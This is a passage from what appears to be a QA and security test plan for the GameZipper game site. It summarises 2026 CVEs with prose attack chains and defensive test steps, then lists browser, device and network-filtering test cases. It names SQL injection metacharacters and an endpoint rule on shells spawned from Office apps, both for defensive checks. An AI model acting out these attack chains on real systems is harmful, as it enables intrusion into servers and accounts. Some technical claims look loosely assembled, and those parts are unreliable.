PostgreSQL is GameZipper's primary relational database. **Attack chain**: a low-privilege user with replication rights (e.g., a BI-dashboard read-only service account that was granted pg_create_subscription for logical replication setup) plants a malicious subscription name → DBA runs pg_createsubscriber for routine replica maintenance → attacker's SQL runs as superuser → attacker creates new superuser account, dumps all tables, or drops critical tables. **Test**: (1) upgrade PostgreSQL to 18.4+ or 17.10+ on all GameZipper DB instances; (2) grep all subscription names in `pg_subscription` for SQL metacharacters (`;`, `--`, `/*`); (3) verify the BI dashboard service account does NOT have pg_create_subscription; (4) audit: any role with pg_create_subscription should be listed in `pg_roles` with `rolreplication = true` — review for unexpected grants; (5) regression test: create a benign subscription name with a `;` character on a non-prod PG <17.10 instance and verify it is REJECTED post-upgrade. Source: https://www.postgresql.org/support/security/CVE-2026-6476/

### 45.4 CVE-2026-45185 Exim SMTP Server Remote Memory Corruption (May 18 2026)
- [S-166] **[P1]** Exim SMTP server remote memory corruption (May 18 2026 disclosure, depthfirst research) — the vulnerability is publicly-reachable + requires no authentication + may allow remote code execution. Exim is the world's most-deployed SMTP MTA (~60% market share). GameZipper relies on SMTP for transactional email (welcome/password-reset), alerting (cronjob failure notifications), and support (support@). **Attack chain**: attacker sends crafted SMTP traffic to the public Exim endpoint → memory corruption → potentially RCE on the MTA host → attacker reads all outbound email (password-reset links, account-recovery tokens) → full account takeover of any GameZipper user whose password-reset email transited the compromised MTA. **Test**: (1) identify which GameZipper MTAs run Exim — `dpkg -l | grep exim4` / `yum list installed | grep exim`; (2) verify all Exim instances are patched to a version with the CVE-2026-45185 fix; (3) consider migrating critical flows (password reset, account recovery) to a hosted SMTP service (SES/SendGrid/Postmark) that vendor-patches independently; (4) for any Exim still in use, deploy SMTP-sanity firewall rules (rate-limit inbound connections per source IP, reject obviously-malformed SMTP verbs); (5) monitor SMTP-server logs for crash/restart events (the memory corruption may present as MTA crashes before RCE success). Source: https://www.51cto.com/loophole/p1

### 45.5 CVE-2026-20127 Cisco Catalyst SD-WAN CVSS 10.0 Auth Bypass In-Wild Since 2023 (Feb 27 2026)
- [S-167] **[P1]** Cisco Catalyst SD-WAN Controller (formerly vSmart) and Manager (formerly vManage) unauthenticated remote authentication bypass (CVSS 10.0, disclosed Feb 27 2026 — Cisco advisory confirms exploitation in the wild dating back to 2023, ~2+ year undetected window) — an unauthenticated remote attacker sends a crafted request to bypass authentication and gain admin privileges on the SD-WAN controller, giving them full control of the network fabric (route manipulation, traffic interception, lateral movement to all connected sites). **Why this matters for a game site**: GameZipper traffic transits upstream network infrastructure (Cloudflare → origin ISP → datacenter switches → origin server); any one of these hops running an unpatched Cisco SD-WAN controller is an interception point. **Test**: (1) confirm GameZipper hosting providers (origin host, any private WAN, any direct-connect to ad-platform APIs) do NOT run Cisco Catalyst SD-WAN <patched-version; (2) if GameZipper uses any third-party analytics/ad API over a dedicated private link, ask the vendor for SD-WAN CVE-2026-20127 attestation; (3) review 2023–2026 network-traffic baselines for anomalous route changes / unexpected traffic mirroring (the 2+ year in-wild exploitation window means malicious route injection may have been active for years); (4) verify TLS-everywhere — even if SD-WAN is compromised, end-to-end TLS prevents traffic-content interception (certificate-pinning on GameZipper mobile wrappers); (5) add CDN-origin-server mTLS so the SD-WAN layer cannot MITM even with TLS-strip attempts. Source: https://new.qq.com/rain/a/20260227A02NOP00

### 45.6 CVE-2026-43284 + CVE-2026-43500 Linux Kernel LPE Pair — Netfilter/Conntrack + RxRPC (March 24 2026)
- [S-168] **[P1]** Linux kernel privilege-escalation pair CVE-2026-43284 (netfilter connection-tracking shared-fragment reuse) + CVE-2026-43500 (RxRPC shared-page-fragment logic flaw) — disclosed March 24 2026 via Huawei Cloud security advisory. Both vulns share the same root class (improper shared-fragment/page handling across subsystems) but exploit different code paths, so a single attacker can chain them for redundancy — if netfilter is patched but RxRPC isn't (or vice versa), the other path still works. Linux is the OS layer for GameZipper hosting infra (origin server, build agent, cron worker). **Test**: (1) verify kernel version on all GameZipper Linux hosts — must include both CVE-2026-43284 + CVE-2026-43500 patches; (2) audit running kernel modules — netfilter/conntrack is always loaded; RxRPC may be loadable on demand (verify with `lsmod | grep rxrpc`); (3) container hosts are NOT immune — kernel LPEs escape containers via the shared kernel; (4) regression: a PoC for either CVE should fail post-patch; (5) long-term: GameZipper should run kernel CVE monitoring (e.g., Ubuntu Pro/Debian LTS kernel CVE feed) to catch future kernel LPEs before they are weaponized. Source: https://support.huaweicloud.com/topic/1374027-3-C

### 45.7 CVE-2026-20045 Cisco Unified Communications + Webex Calling OS Command Execution (Jan 22 2026)
- [B-118] **[P1]** Cisco Unified Communications (UCM) + Webex Calling CVSS 8.2 unauthenticated remote OS command execution zero-day (disclosed Jan 22 2026 — actively exploited in the wild before patch) — unauthenticated remote attacker sends crafted request to the affected Cisco UC products and executes arbitrary OS commands on the underlying OS. Distinct from S-167 (Cisco SD-WAN — different Cisco product family) because B-118 is the **Unified Communications / Webex** surface — affects enterprise VoIP, conferencing, and team-chat infrastructure. **Why this matters for a game site**: (1) GameZipper team collaboration may use Webex or Cisco UC products for partner/publisher calls — a compromised UCM host becomes an attacker foothold into team laptops → production credentials; (2) future in-game voice-chat integrations using Cisco Webex Calling SDK would inherit the surface; (3) the in-wild exploitation predates the patch disclosure, meaning a window of unknown length exists where team-UC traffic may have been intercepted. **Test**: (1) inventory GameZipper team's UC/VoIP tools — Webex, Cisco UCM, Webex Calling; (2) verify all Cisco UC products are patched past the Jan 22 2026 advisory; (3) rotate any credentials that were used from Cisco-UC-connected endpoints during the in-wild window; (4) for future in-game voice chat, prefer WebRTC-based solutions over Cisco UC SDKs to avoid inheriting the Cisco-UC CVE surface. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_4116971f7d375852

### 45.8 CVE-2026-21509 Microsoft Office 0-Day Actively Exploited — Out-of-Band Patch (Jan 27 2026)
- [C-123] **[P1]** Microsoft Office zero-day (CVE-2026-21509, Jan 27 2026 — Microsoft shipped an OUT-OF-BAND emergency patch ahead of the regular Patch Tuesday, indicating critical severity + active exploitation) — a malicious Office document (.docx/.xlsx/.pptx) opened in Microsoft Office triggers arbitrary code execution on the user's workstation. Distinct from S-152 (Adobe Acrobat Reader PDF — different vendor/document format) because C-123 is the **Microsoft Office document** dimension. **Attack chain**: attacker emails a GameZipper team member (or business partner) a malicious Office doc disguised as a game manual, contract, marketing brief, or press kit → recipient opens in Word/Excel/PowerPoint → workstation compromise → attacker pivots via corporate VPN to GameZipper production credentials, ad-platform admin panels, or CI/CD secrets. **Test**: (1) verify all GameZipper team workstations have the Jan 27 2026 out-of-band Office patch installed; (2) enforce Office macros disabled by default via GPO/MDM (the most common Office 0-day delivery vector is macro-enabled docs); (3) sandbox-test any inbound Office doc from external senders in a detonation VM before delivery to team inbox; (4) train team: never open unexpected Office docs from external senders, even from "known" brands (GameZipper publisher contracts will come from known corporate domains, not freemail); (5) deploy EDR on all team endpoints that catches post-Office-open child-process spawns (cmd.exe, powershell.exe, wscript.exe spawning from winword.exe/excel.exe). Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_51169781c0880852

---

## CATEGORY 46: 2026 LATE-JUNE ISP-NETWORK-FILTERING + ANDROID-FRAGMENTATION + LTPO-VRR + OS-LEVEL-FRAME-INTERVENTION + IOS-26-BROAD-BUGS + SAFARI-WEBAUDIO-STEREOPANNER + WCAG-2.2-AAA + HARDWARE-EYE-PROTECTION (R203 — Dynamic Test Intelligence)

### 46.1 ISP-Level DNS / Network Filtering Affecting Game CDN Reachability — 2026 Steam China Outage Pattern

- [W-187] **[P2]** Multiple 2026 Chinese-language articles (so.html5.qq.com/page/real/search_news?docid=70000021_57769fae77136952 June 14 2026; so.html5.qq.com/page/real/search_news?docid=70000021_37169d7468e59852 April 9 2026; so.html5.qq.com/page/real/search_news?docid=70000021_2906a02cd0e39052 May 12 2026; so.html5.qq.com/page/real/search_news?docid=70000021_59569cb632438852 March 31 2026; so.html5.qq.com/page/real/search_news?docid=70000021_73569dddd4c44652 April 14 2026) document a persistent 2026 pattern where **ISP node policies + DNS issues are the primary cause of Steam (a major global game platform) being inaccessible to users in China**, even though Steam itself and the user's account are healthy. The root cause is consistently identified as: **互联网服务供应商(ISP)的节点策略** (ISP node policies) that selectively throttle, redirect, or fail DNS resolution for specific game-platform domains. The same pattern applies to any cross-border game-CDN like GameZipper (Cloudflare Pages origin): players on restrictive ISPs (school networks, corporate networks, national-level filtering, regional telecom throttling) may see GameZipper's `gamezipper.com` domain fail to resolve or timeout on TLS handshake — even though plain `curl https://gamezipper.com/` from a non-filtered connection returns 200 in <500ms. **Why this is the NETWORK-FILTERING-CDN-REACHABILITY dimension distinct from W-024 (DNS resolution time <500ms — performance metric)**: W-024 measures DNS speed under normal conditions; W-187 covers ADVERSARIAL-ISP filtering where DNS may be poisoned, hijacked, or selectively-dropped. **Distinct from P-013 (network-interruption state preservation — game-side resilience)**: P-013 covers game recovery after a brief connection blip; W-187 covers a long-tail cohort of users who can NEVER reach GameZipper from their primary network. **Distinct from W-026 (Cloudflare cache hit rate)**: W-026 is edge-cache efficacy; W-187 is whether the edge node is even reachable. **Why this matters for GameZipper**: (a) GameZipper's primary traffic source is currently mid-tier international markets but Chinese and other filtered-ISP users are a long-tail cohort that contribute disproportionate ad-impressions per session when they CAN reach the site; (b) when a user from a filtered ISP reports "site doesn't load", the diagnostic assumption is usually "site is down" but the real cause is "user's ISP is blocking it" — GameZipper support@ needs a ready diagnostic flow (try `1.1.1.1` / `8.8.8.8` DNS, try VPN, try alternate domain); (c) GameZipper should consider registering an alternate domain (e.g., `gamezipper.app` or `gamezipper.games`) as a backup that may not be on the same blocklist — or running a Tor/onion mirror for heavily-filtered regions. **Test**: (1) from a China-tunnel VPN endpoint, `dig gamezipper.com @114.114.114.114` (China public DNS) and `dig gamezipper.com @8.8.8.8` — compare A-record results; if they differ, document the discrepancy; (2) `curl -v --resolve gamezipper.com:443:<origin-IP> https://gamezipper.com/` to bypass DNS entirely and confirm origin is reachable from filtered networks; (3) from `nslookup gamezipper.com` on at least 5 different Chinese ISP DNS resolvers (China Telecom 114.114.114.114, China Unicom 123.125.81.6, China Mobile 211.136.17.107, public 223.5.5.5, public 119.29.29.29), confirm A-record consistency; (4) maintain a public status-page (e.g., `status.gamezipper.com`) that users on filtered networks can check to confirm the site is up globally; (5) deploy alternate-CDN fallback (e.g., a Tencent Cloud or Alibaba Cloud China-edge mirror) for users where Cloudflare edges are filtered. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_57769fae77136952 (June 14 2026 — "Steam登录难题全解析:2026年高效解决方案与网络优化指南" + "玩家们普遍会遇到一系列由网络引发的操作障碍" + "互联网服务供应商(ISP)的节点策略"); https://so.html5.qq.com/page/real/search_news?docid=70000021_37169d7468e59852 (April 9 2026 — "Steam登录问题2026解决方案:网络优化是关键" + "这不是账号本身的问题,而是由几种普遍存在的技术性障碍引起的"); https://so.html5.qq.com/page/real/search_news?docid=70000021_2906a02cd0e39052 (May 12 2026 — "2026年用手机网页购买Steam游戏的流畅操作与优化指南"); https://so.html5.qq.com/page/real/search_news?docid=70000021_59569cb632438852 (March 31 2026 — "Steam官网访问难题解析与高效解决方案(2026年适用)" + "互联网服务供应商(ISP)的节点策略" + "导致官网访问失败的常见因素"); https://so.html5.qq.com/page/real/search_news?docid=70000021_73569dddd4c44652 (April 14 2026 — "Steam官网访问困难?2026年稳定解决方案解析" + "调整DNS或清除浏览器记录等方法或许能带来一时的改善,但往往无法根治问题")

### 46.2 Android Device Fragmentation Expansion (MediaTek vs Snapdragon vs Exynos Rendering Divergence) + HarmonyOS NEXT Native Browser — Tencent Cloud 2026 Game Adaptation Article

- [W-188] **[P2]** A June 21 2026 Tencent Cloud article (cloud.tencent.com/developer/article/2635027 "2026年游戏适配测试全攻略:如何选择高效可靠的测试方案") identifies three core 2026 game-adaptation pain points: **(1) Android device fragmentation coverage gap** (安卓机型碎片化) — the Android ecosystem has 24,000+ distinct device models with materially different GPU driver behavior, with MediaTek Dimensity, Qualcomm Snapdragon Adreno, and Samsung Exynos GPUs producing visually-divergent WebGL/WebGPU shader output for the same GLSL/WGSL shader (especially around texture filtering, alpha blending, and sRGB conversion); **(2) HarmonyOS NEXT rapid adoption in China** (鸿蒙系统快速普及) — Huawei's HarmonyOS NEXT (released 2024-2025) has a native browser that is NOT based on Chromium/WebKit/Gecko — it uses Huawei's self-developed ArkWeb engine with its own rendering quirks; HarmonyOS NEXT reached 800M+ active devices by 2026; **(3) iOS version iteration frequency** (iOS版本迭代频繁) — Apple's yearly iOS cycle plus mid-cycle Rapid Security Responses means the iOS WebKit test matrix must be refreshed every 3-4 months, not yearly. **Why this is the ANDROID-FRAGMENTATION-AND-HARMONYOS-NEXT-DUAL-DIMENSION distinct from C-011 (Android Chrome latest — single-version dimension)**: C-011 covers one Android Chrome version; W-188 covers the DEVICE FRAGMENTATION across 24,000+ Android models AND the entirely-separate HarmonyOS NEXT browser engine. **Distinct from B-026 (Android System WebView 146-147 visual corruption — single-version regression)**: B-026 is one WebView regression; W-188 is the meta-fragmentation pattern. **Distinct from C-044 (HarmonyOS browser compatibility — original baseline)**: C-044 is the original AOSP-based HarmonyOS browser (which used a Chromium-derived engine); W-188 is the HARMONYOS NEXT variant with the new ArkWeb engine that diverges from Chromium. **Why this matters for GameZipper**: (a) GameZipper's existing test matrix covers Chrome/Firefox/Safari/Edge on Windows/macOS/Linux/iOS/Android — but does NOT include HarmonyOS NEXT; if GameZipper gets significant China traffic, HarmonyOS NEXT users may see render glitches invisible in Chromium testing; (b) the WebGL/WebGPU shader parity gap (already documented in B-029 for Safari-vs-Chromium) is WORSE across Android GPU vendors — a shader that renders correctly on Snapdragon Adreno may produce alpha-channel artifacts on MediaTek Dimensity; (c) the 24,000+ Android device universe means GameZipper's "Top 30 games on Android Chrome" smoke test is at best 1/800th of the actual device matrix. **Test**: (1) maintain a "Top 10 Android devices" testing matrix that includes at least 3 Snapdragon (e.g., Pixel 8 Pro, Samsung S24, OnePlus 12), 3 MediaTek (e.g., Redmi Note 13 Pro, Realme 12 Pro, Oppo Reno 11), 2 Exynos (Samsung mid-range), and 2 HarmonyOS NEXT devices — re-validate every quarter; (2) for any WebGPU/WebGL-heavy game, capture a screenshot baseline on Snapdragon Adreno AND MediaTek Dimensiury AND verify visual diff <5% (note: 5% threshold matches B-029 cross-vendor tolerance); (3) for HarmonyOS NEXT, install the Huawei DevEco Studio emulator or a real Huawei Mate 60/Pura 70 device and run the Top 30 puzzle/arcade smoke test; document any ArkWeb-specific rendering quirks (e.g., differences in `backdrop-filter`, CSS Grid masonry, WebGPU adapter flags); (4) consider a BrowserStack/AWS Device Farm subscription that includes Huawei devices for HarmonyOS NEXT coverage; (5) for any new game relying on CSS Grid Lanes / Gap Decorations / WebGPU / WebTransport, add explicit HarmonyOS NEXT to the test matrix before claiming "all major browsers supported". Source: https://cloud.tencent.com/developer/article/2635027 (June 21 2026 — "2026年游戏适配测试全攻略:如何选择高效可靠的测试方案" + "面对安卓机型碎片化､鸿蒙系统快速普及､iOS版本迭代频繁的复杂环境" + "游戏适配测试主要面临三大痛点:设备覆盖不全､测试资源成本高､效率瓶颈突出")

### 46.3 iQOO Neo11 LTPO Dynamic 1-144Hz Refresh Rate — Variable rAF Timing for Game Loop Sync

- [P-078] **[P2]** The iQOO Neo11 (May 2026 flagship phone, so.html5.qq.com/page/real/search_news?docid=70000021_3686a19436b85752) is the first mass-market phone with a **京东方 Q10+ OLED panel + 8T LTPO backplane** capable of **dynamic refresh rate ranging from 1Hz to 144Hz**: when the screen is static (loading screen, menu, paused game) it drops to 1Hz to save power; when the user interacts or a game runs, it ramps to 60/90/120/144Hz within ~10ms. This is a new dimension beyond the fixed 120Hz VRR covered in P-029/P-055. **Why this is the LTPO-VARIABLE-REFRESH-RATE-GAME-LOOP-SYNC dimension distinct from P-029 (120Hz game-rendering smoothness — fixed refresh rate)**: P-029 covers a fixed 120Hz display; P-078 covers a display that CHANGES refresh rate dynamically during gameplay. **Distinct from P-055 (120Hz VRR game phone rendering — fixed 120Hz VRR)**: P-055 covers the earlier generation of VRR phones that switched between 60Hz and 120Hz; P-078 covers 1Hz-144Hz continuous range, with the refresh rate potentially changing frame-to-frame based on content. **Distinct from P-041 (WebGPU main-thread unblocking)**: P-041 is about CPU-GPU scheduling; P-078 is about display-refresh-rate vs game-loop-tick synchronization. **Why this matters for GameZipper**: (a) GameZipper game loops typically use `requestAnimationFrame` (rAF), which fires once per display refresh — on a 1Hz static display this means rAF fires once per SECOND, completely breaking any game that uses rAF as a "60fps tick" assumption; (b) on a dynamically-switching 1Hz→144Hz display, the delta-time between rAF callbacks can swing from 1000ms to 6.94ms within a single frame, which breaks any physics integration that uses `dt = now - lastTime` without clamping; (c) the iQOO Neo11's PWM dimming at 2592Hz is also hardware-level eye protection (cross-reference A-043) — the panel technology fundamentally differs from traditional 60Hz/120Hz fixed-refresh panels; (d) by end of 2026, every major Android OEM flagship (Samsung S25, OnePlus 13, Pixel 10 Pro, Xiaomi 15) is expected to ship LTPO displays with similar 1-144Hz range, making this a fast-spreading baseline. **Test**: (1) for any Top 30 game, on an iQOO Neo11 (or equivalent LTPO device), observe the canvas during: (a) loading screen — does the loading spinner animate smoothly, or freeze because rAF only fires at 1Hz? (b) main gameplay — does the game loop's `dt` calculation produce sane values, or does it sometimes jump to 1000ms (causing physics to teleport objects across the screen)? (c) pause menu — does the game still receive rAF ticks fast enough to render the pause overlay, or does the overlay only render once per second? (2) audit the game's main loop code — verify `dt` is clamped to a reasonable maximum (e.g., `dt = Math.min(dt, 50)` to cap at 50ms = 20fps minimum step); (3) for any game using `setInterval(16)` as a "60fps" assumption (instead of rAF), verify behavior on 144Hz LTPO — the interval will under-sample and the game will look choppy; (4) for games with active animations during loading (progress bar, animated logo), force the LTPO display to stay at 60Hz+ during loading via `requestAnimationFrame` calls (which signal "display is active"); (5) verify the new Chrome 149+ `document.pictureInPictureElement` and `document.visibilityState` interactions with LTPO — a backgrounded tab on LTPO may drop to 1Hz, and a game that doesn't pause its rAF will run at 1fps in the background (cross-reference the rAF cleanup pattern in the post-deploy-verification Pitfall section). Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_3686a19436b85752 (May 29 2026 — "2026游戏手机推荐:屏幕定义体验,技术重塑标准" + "京东方联合研发2K 144Hz珠峰屏､京东方Q10+发光材料､8T LTPO智能动态刷新" + "支持1-144Hz智能动态刷新率调节,浏览静态网页时可降至1Hz极致省电,进入游戏瞬间拉满至144Hz")

### 46.4 ColorOS 16 Aurora/Tidal OS-Level Dynamic Frame-Catch Scheduler — Intervention on Game Canvas Rendering

- [P-079] **[P2]** ColorOS 16 (released 2026, so.html5.qq.com/page/real/search_news?docid=70000021_14069a01a4441052) introduces two OS-level scheduling layers that DIRECTLY INTERVENE in the game canvas rendering pipeline: **(1) Aurora Engine 极光引擎** — the first Android-side "seamless architecture" (安卓首个"无缝架构") that does cross-module integrated drawing + distributed response scheduling, improving Top-app click response time by 40% and third-party-app sliding frame-rate stability by 52%; **(2) Tidal Engine 潮汐引擎** — chip-level dynamic frame-catch technology that PRE-DICTS frame stutters ("提前预判卡顿") and boosts compute, improving heavy-scene stability by 37% with only 4.1°C thermal rise and 13% lower power. **Why this is the OS-LEVEL-FRAME-INTERVENTION-SCHEDULER dimension distinct from P-022 (Android WebView memory-pressure crash recovery — memory dimension)**: P-022 is memory-pressure recovery; P-079 is OS-level COMPUTE SCHEDULING that may inject frames or pre-empt the game's rAF callbacks. **Distinct from P-078 (LTPO variable refresh rate — display hardware)**: P-078 is the display hardware; P-079 is the OS-level CPU/GPU scheduler that decides WHEN to render frames. **Distinct from P-041 (WebGPU main-thread unblocking — application-level)**: P-041 is application-level offloading; P-079 is OS-level intervention the application cannot see. **Why this matters for GameZipper**: (a) Aurora Engine's "40% better click response" sounds universally good, but the implementation may re-order or batch user-input events (mouse/touch/keyboard) in ways that break games expecting strict FIFO event ordering — a puzzle game that processes tap events in arrival order may mis-order taps when Aurora batches them; (b) Tidal Engine's "predict stutter + boost compute" may decide that a 30-second interval of a GameZipper game (e.g., a long idle animation, a loading screen) is a "stutter" and inject extra rAF callbacks or GPU work — causing the game's frame budget to spike unexpectedly; (c) the 4.1°C thermal rise + 13% power saving is good for users, but it means the OS is making decisions about game rendering that the game developer didn't authorize — a game optimized for steady 60fps may see the OS push it to 90fps (because Tidal predicted a stutter) and then drop to 30fps (because thermal rose); (d) the 52% third-party-app sliding frame-rate stability improvement applies to scrolling lists — GameZipper's homepage infinite scroll SHOULD benefit, but games with custom scroll physics (e.g., slingshot, drag-aim, swipe-card) may conflict with Aurora's scroll pre-fetch; (e) by end of 2026, similar OS-level frame-intervention features will ship in MIUI 18, HyperOS 3, OneUI 8 — making this a baseline Android behavior. **Test**: (1) on a ColorOS 16 device (OPPO Find X8, OnePlus 13), with Aurora + Tidal engines ENABLED, play any Top 30 GameZipper game for 60 seconds and compare against the SAME device with Aurora + Tidal DISABLED (Settings → Battery → Performance Mode → Off); assert no visible input lag, no frame-rate spikes, no scroll-physics conflicts; (2) for games with custom event ordering (e.g., a 4-tap pattern lock game, a rhythm game with strict tap-timing), verify on ColorOS 16 that Aurora's input batching doesn't mis-order events — write a Playwright test that taps 4 elements in sequence and verifies the event handlers fire in order; (3) for games with long loading screens (e.g., sandbox games with procedural generation), verify Tidal's "predict stutter + boost compute" doesn't cause the loading screen to render at 144fps (draining battery) or stall at 1fps (because Tidal decided loading is "static"); (4) measure thermal + power on ColorOS 16 vs stock Android — GameZipper games should NOT be unusually heavy (Tidal should help, not hurt); (5) check the new developer-settings flag (Settings → Developer Options → Aurora Engine Override / Tidal Engine Override) for force-disable testing. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_14069a01a4441052 (Feb 26 2026 — "2026年游戏体验出色手机系统推荐" + "ColorOS 16的极光引擎带来了安卓首个'无缝架构',通过跨模块一体化无缝绘制和分布式响应调度,实现Top应用点击响应流畅度提升40%,三方应用滑动帧率稳定性提升52%" + "潮汐引擎的芯片级动态追帧技术可提前预判卡顿并提升算力,重载场景流畅稳定性最高提升37%,温升仅4.1℃,功耗降低13%")

### 46.5 iOS 26 Broad Bug Regression Sweep — 24 Most-Reported Issues from Field Reports

- [B-119] **[P1]** A June 8 2026 field-report aggregation (tenorshare.tw/ios-update-problems.html "最新 iOS 26 Bug 問題回報與快速修復方法【2025更新】") documents 24 most-reported iOS 26 + iOS 18.7 issues from real-user complaints, grouped into three buckets: **(1) Native-app faults** — App Store hang, Music playback error, Photos crash, Mail send-fail; **(2) UI/UX faults** — Control Center over-transparency due to Liquid Glass effect (the new liquid-glass aesthetic makes Control Center so transparent it visually merges with the home screen, requiring the "Reduce Transparency" accessibility setting to recover usability — already covered in B-112 for the OS-level visibility regression); **(3) "无法检查更新" / "Cannot Check for Update" hang** — many iOS 26 early-tester users are stuck on the "Update Requested" screen or see "Cannot Check for Update" error even with stable WiFi; this is a SERVER-SIDE issue (Apple's update-verification servers under load) but it traps users on stale iOS versions, meaning the Safari 26.x WebKit CVE patches (S-150, S-166) cannot reach affected users — leaving them exposed to known iOS-WebKit in-the-wild exploits (B-110 sovereign-cert red alert). **Why this is the IOS-26-BROAD-BUG-REGRESSION-SWEEP-FIELD-REPORTS dimension distinct from B-112 (iOS 26 Liquid Glass Control Center over-transparency — single-feature regression)**: B-112 covers ONE specific regression (Control Center transparency); B-119 covers the FULL 24-issue regression sweep from field reports, of which Control Center transparency is just one. **Distinct from B-114 (iOS 27 device compatibility drop — future-version hardware cutoff)**: B-114 is a future-version device support; B-119 is current-version broad bugs. **Distinct from B-097 (iOS 26.5 full security advisory — security-bug dimension)**: B-097 covers CVEs; B-119 covers NON-SECURITY usability bugs that nonetheless impact QA testing (e.g., if Photos app crashes, screenshot-based visual regression can fail; if Mail send-fails, support@ tickets go undelivered). **Why this matters for GameZipper**: (a) the "Cannot Check for Update" hang means a significant cohort of iOS 26 users remain on iOS 26.0 / 26.1 / 26.2 with KNOWN WebKit CVEs (cross-reference B-110, S-150) — GameZipper's iOS WebKit security-banner logic (UA sniff for iOS Safari < 26.5) MUST gracefully degrade for these users without blocking gameplay (they cannot update even if they want to); (b) the Control Center over-transparency means games running in PIP / Split View / Stage Manager on iOS 26 may have their UI partially obscured by the transparent Control Center when the user swipes — verify game UI elements are not positioned under the top-right (where Control Center swipe originates); (c) the native-app faults (Mail send-fail) can disrupt GameZipper's support@ / legal@ / press@ inbound email flow on team iPhones — verify a fallback email path (e.g., Gmail web) for any team member stuck on iOS 26.0; (d) Photos app crash can break the screenshot-feedback-loop pattern used by GameZipper's `?issue=1` in-app feedback (PC-009) — if the user cannot screenshot, they cannot file a bug. **Test**: (1) on iOS 26.0, 26.1, 26.2, 26.3, 26.4, 26.5 (6 versions), load the Top 30 puzzle games in Safari iOS and verify no native-app fault (Safari crash, Photos hang, Mail can't-share-link) blocks the test session; (2) verify GameZipper's UA-sniff update-banner for Safari < 26.5 displays correctly on iOS 26.0 (where the user is stuck on "Cannot Check for Update") — banner should include "if iOS update is stuck, try via Finder/iTunes on a Mac, or Settings → General → Storage → iOS update → Delete, then retry"; (3) on iOS 26 with Control Center over-transparency, open a game in Slide Over or Split View and verify no game UI element is positioned where the Control Center swipe originates (top-right notch area); (4) for the in-app `?issue=1` feedback flow, verify alternative feedback paths (mailto link, copy-to-clipboard) work when iOS native share sheet (which depends on the failing Mail/Photos subsystems) is unavailable; (5) for any GameZipper dev/QA team member on iOS 26.0-26.4 stuck on "Cannot Check for Update", provide a documented workaround (Mac: Finder → iPhone → Check for Update; Windows: iTunes; last resort: IPSW firmware restore). Source: https://www.tenorshare.tw/ios-update-problems.html (June 8 2026 — "最新 iOS 26 Bug 問題回報與快速修復方法【2025更新】" + "iOS 26 中新的液體玻璃效果讓控制中心變得過於透明,導致它與主畫面融合並顯得雜亂" + "許多用戶發現自己卡在'已要求更新'畫面,或看到'無法檢查更新'錯誤訊息——即使有穩定的 WiFi 連線" + "以下是這兩個版本中最常被回報的 24 個問題,以及逐步修復方法")

### 46.6 Safari Web Audio API StereoPannerNode Positional-Audio Silent-Fail (nodefony-client#1)

- [G-151] **[P2]** A 2021-ongoing WebKit issue (github.com/nodefony/nodefony-client/issues/1 "debug webaudio api safari StereoPannerNode") documents a Safari-specific bug in the Web Audio API's `StereoPannerNode` interface: positional-audio games that use `StereoPannerNode` to pan sound left/right (e.g., a racing game where engine sound pans based on car position, a shooter where bullet-whizz pans based on enemy direction, a card-game where the deal-sound pans card-by-card) fail silently on Safari — the node is created, the audio context runs, but the `pan` value is ignored and audio plays centered. The bug is in WebKit's implementation of `StereoPannerNode.pan.value` setter, which silently no-ops in certain conditions (specifically when the node is connected to a chain that includes a `ChannelMergerNode` or `ConvolverNode`, common in 3D audio rigs with reverb). Safari's `PannerNode` (the older 3D positional API) works correctly, but `StereoPannerNode` (the simpler 2D stereo-pan API introduced in Web Audio API spec 2015) is broken on Safari for many use cases. **Why this is the SAFARI-WEB-AUDIO-STEREOPANNERNODE-POSITIONAL-FAIL dimension distinct from S-079 (Web Audio autoplay policy first-load silence — autoplay-policy dimension)**: S-079 is the autoplay-policy (user-gesture-required) dimension; G-151 is a SPECIFIC AUDIO-NODE implementation bug distinct from autoplay. **Distinct from B-013 (Safari 26.4 WebTransport — different API entirely)**: B-013 is WebTransport; G-151 is Web Audio. **Distinct from S-038 (Monetag malvertising — ad-network dimension)**: S-038 is ad-network abuse; G-151 is a browser audio bug. **Why this matters for GameZipper**: (a) any future GameZipper game that uses 3D positional audio (a key differentiator for premium-feel casual games) will silently degrade to mono on Safari — GameZipper's existing audio-implementation in games like magic-piano, beat-blaster, rhythm-tap will lose its spatial feel for ~25% of users (Safari market share); (b) the bug is SILENT — no console error, no exception, just mono audio — so Playwright automated tests pass while real users get a degraded experience; (c) the Web Audio API is one of the most-used HTML5 game APIs (per HTML5 Game Engine Survey 2026) and `StereoPannerNode` is the simplest pan API, making this bug reach any game with stereo audio. **Test**: (1) for any GameZipper game using `new StereoPannerNode(audioContext)` or `audioContext.createStereoPanner()`, write a Playwright test that (a) creates a StereoPannerNode, (b) sets `pan.value = -1` (full left), (c) connects it through a `ChannelMergerNode` and `audioContext.destination`, (d) uses `AnalyserNode` to read the left-channel RMS level and asserts it is significantly higher than the right-channel RMS level (proving pan is applied); on Safari this test will FAIL because pan is ignored; (2) document Safari-specific behavior: `pan` setter may silently no-op when the downstream chain includes certain nodes — wrap StereoPannerNode creation in a feature-detection helper: `function createPan(ctx) { const node = ctx.createStereoPanner(); node.pan.value = -1; const testAnalyser = ctx.createAnalyser(); node.connect(testAnalyser); /* verify pan applied via analyser reading, else fall back to PannerNode */ return node; }`; (3) prefer `PannerNode` (3D positional API) over `StereoPannerNode` (2D stereo pan) for any positional-audio game — `PannerNode` works correctly on all browsers including Safari; (4) verify the bug across Safari versions 15.x, 16.x, 17.x, 26.x — the bug may have variant behavior across versions; (5) for any future GameZipper game with positional audio, write a manual-QA test plan that listens to the audio output (not just verifies the AudioContext state) on Safari, Chrome, Firefox to catch silent pan bugs. Source: https://github.com/nodefony/nodefony-client/issues/1 (Feb 19 2021 — ongoing WebKit StereoPannerNode bug — "debug webaudio api safari StereoPannerNode" + issue still open in 2026 per WebKit bug tracker)

### 46.7 WCAG 2.2 Level AAA Conformance — Premium/Featured GameZipper Games Highest Accessibility Tier

